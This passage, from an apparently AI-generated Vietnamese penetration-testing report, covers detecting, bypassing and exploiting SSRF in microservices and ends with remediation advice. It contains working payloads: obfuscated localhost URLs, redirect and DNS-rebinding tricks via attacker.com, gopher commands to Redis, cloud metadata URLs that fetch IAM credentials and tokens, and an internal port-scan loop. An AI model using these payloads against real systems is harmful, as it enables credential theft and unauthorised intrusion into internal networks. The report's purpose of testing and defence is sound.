test_time = time.time() - start  # ~5-10s (connection timeout)

# Nếu test_time >> baseline_time → Có thể là SSRF
```

---

#### 5.1.3. Response-based Detection

**Phân tích response differences**:

```python
# Baseline
response_baseline = requests.get('/api/fetch?url=http://example.com')

# Test with localhost
response_test = requests.get('/api/fetch?url=http://localhost:8080')

# Compare:
if response_test.status_code != response_baseline.status_code:
    print("Different status code → Possible SSRF")

if abs(len(response_test.text) - len(response_baseline.text)) > 100:
    print("Different content length → Possible SSRF")

# Check for internal info leakage
if 'internal' in response_test.text.lower():
    print("Internal info leaked → SSRF confirmed")
```

---

#### 5.1.4. Error-based Detection

**Phân tích error messages**:

```python
# Common SSRF error messages:
ssrf_indicators = [
    'Connection refused',
    'Connection timeout',
    'No route to host',
    'Name or service not known',
    'getaddrinfo failed',
    'Failed to connect to',
    'Could not resolve host',
    'Network is unreachable'
]

# Test
response = requests.get('/api/fetch?url=http://192.168.1.1:9999')

for indicator in ssrf_indicators:
    if indicator in response.text:
        print(f"SSRF indicator found: {indicator}")
```

---

### 5.2. Bypass Techniques

#### 5.2.1. URL Encoding

```python
# Original
http://localhost/

# URL encoded
http://%6c%6f%63%61%6c%68%6f%73%74/

# Double encoded
http://%256c%256f%2563%2561%256c%2568%256f%2573%2574/
```

#### 5.2.2. IP Obfuscation

```python
# Decimal
http://2130706433/  # 127.0.0.1

# Octal
http://0177.0.0.1/

# Hex
http://0x7f.0x0.0x0.0x1/

# Mixed
http://127.1/       # Short form of 127.0.0.1
```

#### 5.2.3. DNS Rebinding

```python
# Setup DNS server với TTL=0
# First resolution: 1.2.3.4 (public IP, passes whitelist)
# Second resolution: 127.0.0.1 (private IP, SSRF!)

# Attack URL
http://rebind.attacker.com/
```

#### 5.2.4. Protocol Smuggling

```python
# Gopher protocol (can send arbitrary TCP data)
gopher://127.0.0.1:6379/_SET%20ssrf%20%22pwned%22

# Dict protocol
dict://127.0.0.1:11211/stats

# File protocol
file:///etc/passwd
```

#### 5.2.5. Redirect-based

```python
# Setup redirect on attacker server
# http://attacker.com/redirect → http://169.254.169.254/

# Vulnerable app follows redirect:
GET /api/fetch?url=http://attacker.com/redirect
# → App fetches from 169.254.169.254
```

---

### 5.3. Exploitation Strategies

#### 5.3.1. Cloud Metadata Exploitation

**AWS**:
```bash
# Get instance metadata
http://169.254.169.254/latest/meta-data/

# Get IAM credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]

# Get user-data (often contains secrets)
http://169.254.169.254/latest/user-data/
```

**GCP**:
```bash
# Requires Metadata-Flavor header
http://metadata.google.internal/computeMetadata/v1/?recursive=true

# Get access token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure**:
```bash
# Get instance info
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Get access token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

---

#### 5.3.2. Internal Service Discovery

```python
# Common microservice ports
ports_to_scan = [
    8080, 8081, 8082, 8083,  # Service instances
    3000, 5000, 9000,        # Node.js, Python, etc.
    6379,                     # Redis
    27017,                    # MongoDB
    9200,                     # Elasticsearch
    5672,                     # RabbitMQ
]

# Docker network range
docker_ips = ['172.17.0.' + str(i) for i in range(1, 255)]

# Scan
for ip in docker_ips:
    for port in ports_to_scan:
        test_url = f"http://{ip}:{port}/"
        # Inject via SSRF
```

---

#### 5.3.3. Database Access

```python
# Redis (if accessible)
# Gopher protocol để gửi Redis commands
payload = 'gopher://redis-server:6379/_'
payload += 'SET%20ssrf%20%22exploited%22%0D%0A'
payload += 'GET%20ssrf%0D%0A'
payload += 'QUIT%0D%0A'

# MongoDB (HTTP interface)
http://mongodb-server:28017/

# Elasticsearch
http://elasticsearch:9200/_cluster/health
http://elasticsearch:9200/_cat/indices
```

---

## 6. KẾT QUẢ VÀ PHÁT HIỆN

### 6.1. Typical Findings

**Vulnerable Endpoints**:
```
1. /api/fetch?url=
2. /api/proxy?callback_url=
3. /api/thumbnail?image=
4. /api/webhook?webhook_url=
5. /api/import?file=
```

**Common Vulnerable Parameters**:
```
- url, uri
- callback, callback_url
- webhook, webhook_url
- fetch, load
- image, file, path
- redirect, return_url
```

### 6.2. Impact Assessment

**Critical (10.0)**:
- Access to cloud metadata (IAM credentials)
- RCE via protocol smuggling
- Database access

**High (8.0-9.0)**:
- Internal network scanning
- Service discovery
- Read internal files

**Medium (5.0-7.0)**:
- Blind SSRF (no data exfiltration)
- Port scanning only

### 6.3. Real-world Examples

**Example 1: AWS Metadata Access**
```python
# Vulnerable endpoint
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role

# Response:
{
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "2025-12-18T..."
}

# Impact: Full AWS account compromise
```

**Example 2: Internal Service Discovery**
```python
# Discovered services via SSRF:
172.17.0.2:8080 - User Service
172.17.0.3:8081 - Order Service  
172.17.0.4:5432 - PostgreSQL
172.17.0.5:6379 - Redis
172.17.0.6:9200 - Elasticsearch

# Impact: Full internal network mapped
```

---

## 7. KHUYẾN NGHỊ

### 7.1. For Developers

**Input Validation**:
```python
# Whitelist allowed domains
ALLOWED_DOMAINS = ['example.com', 'api.partner.com']

def validate_url(url):
    parsed = urlparse(url)
    
    # Check scheme
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")
    
    # Check domain
    if parsed.netloc not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")
    
    # Check for private IPs
    if is_private_ip(parsed.netloc):
        raise ValueError("Private IP not allowed")
    
    return True
```

**IP Filtering**:
```python
import ipaddress

def is_private_ip(hostname):
    """Check if hostname resolves to private IP"""
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback
    except:
        # Resolve hostname
        import socket
        ip_str = socket.gethostbyname(hostname)
        ip = ipaddress.ip_address(ip_str)
        return ip.is_private or ip.is_loopback
```

**Disable Dangerous Protocols**:
```python
# requests library
import requests

# Disable redirects
response = requests.get(url, allow_redirects=False)

# Use timeout
response = requests.get(url, timeout=5)

# Restrict protocols (only HTTP/HTTPS)
if not url.startswith(('http://', 'https://')):
    raise ValueError("Invalid protocol")
```

### 7.2. For Security Teams

**Defense-in-Depth**:
1. ✅ Network segmentation
2. ✅ Principle of least privilege
3. ✅ WAF with SSRF rules
4. ✅ Egress filtering
5. ✅ Metadata service protection (IMDSv2)

**Monitoring & Detection**:
```python
# Log all outbound requests
logger.warning(f"Outbound request: {url} from {source_ip}")

# Alert on suspicious patterns
if is_metadata_url(url):
    alert("SSRF attempt to metadata service!")

if is_internal_ip(url):
    alert("SSRF attempt to internal network!")
```

### 7.3. For Pentesters

**Testing Checklist**:
- [ ] Identify all URL parameters
- [ ] Test with callback server
- [ ] Try protocol bypass techniques
- [ ] Test encoding variations
- [ ] Check cloud metadata access
- [ ] Scan internal network
- [ ] Document all findings
- [ ] Provide remediation advice

---

## 8. KẾT LUẬN

Module Blackbox của Microservice Penetration Testing Toolkit cung cấp một framework toàn diện cho việc phát hiện và khai thác SSRF vulnerabilities trong môi trường microservices. Với các kỹ thuật reconnaissance tự động, detection dựa trên callback server, và exploitation tools mạnh mẽ, module này là công cụ thiết yếu cho security researchers và penetration testers.

**Điểm mạnh**:
- ✅ Automated reconnaissance và discovery
- ✅ High-accuracy SSRF detection với callback server
- ✅ Comprehensive payload strategies
- ✅ Internal network exploitation capabilities
- ✅ Cloud-aware testing

**Hướng phát triển**:
- Advanced bypass techniques (DNS rebinding, etc.)
- Machine learning-based endpoint discovery
- Integrated with more security tools (Burp, ZAP)
- Automated report generation
- GUI interface

---

**Tài liệu tham khảo**:
- OWASP SSRF Guide
- PortSwigger SSRF Academy
- AWS Security Best Practices
- HackerOne SSRF Reports

**Liên hệ**:
- GitHub: microservice_pentest_toolkit
- Email: security@example.com

---

*Báo cáo này được tạo tự động bởi AI Assistant - December 18, 2025*
